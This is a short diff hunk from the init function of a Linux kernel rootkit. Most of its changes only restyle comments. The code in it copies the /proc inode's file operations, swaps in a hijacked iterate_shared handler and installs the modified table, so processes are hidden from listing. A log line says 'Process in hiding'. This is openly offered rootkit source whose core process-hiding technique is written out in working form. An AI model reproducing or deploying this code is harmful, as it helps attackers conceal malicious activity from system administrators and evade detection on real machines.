@@ -413,11 +413,11 @@ static int __init rootkit_init(void){
         	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
 		return 0;
 	}
-	proc_inode = p.dentry->d_inode;/*get the inode*/
-    	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
-   	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
-  	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
-   	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
+	proc_inode = p.dentry->d_inode;// get the inode
+    	proc_fops = *proc_inode->i_fop;// get a copy of file_oprartions from inode
+   	backup_proc_fops = proc_inode->i_fop;// back up file_operation
+  	proc_fops.iterate_shared = overwritten_iterate_shared; // modify copy without hijacked function */
+   	proc_inode->i_fop = &proc_fops; // overwrite the proc entry file operations 
 	printk(KERN_INFO "@$@?: Process in hiding");
 	//End Carlos
 		
